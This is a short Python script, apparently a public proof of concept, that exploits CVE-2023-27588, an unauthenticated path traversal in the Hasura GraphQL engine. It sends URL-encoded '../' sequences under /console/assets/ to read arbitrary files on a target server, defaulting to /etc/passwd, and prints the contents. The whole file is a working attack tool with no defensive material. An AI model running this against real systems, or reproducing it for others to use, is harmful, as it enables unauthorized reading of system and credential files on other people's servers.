#!/usr/bin/env python3

import requests
import argparse

def exploit(url, file):
    payload = f"{url}/console/assets/..%2F..%2F..%2F..%2F..%2F..{file}"
    res = requests.get(payload, verify=False)
    print(res.text)

def main():
    # Parse arguments
    parser = argparse.ArgumentParser(description="CVE-2023-27588 - Unauthenticated Path Traversal in Hasura GraphQL engine <= v2.20.0")
    parser.add_argument("-u", "--url", help="target URL: http://127.0.0.1:8080", required=True)
    parser.add_argument("-f", "--file", help="file to read. Default: /etc/passwd", default="/etc/passwd")
    args = parser.parse_args()

    # Read args
    url = args.url
    file = args.file

    exploit(url, file)

if __name__ == "__main__":
    main()
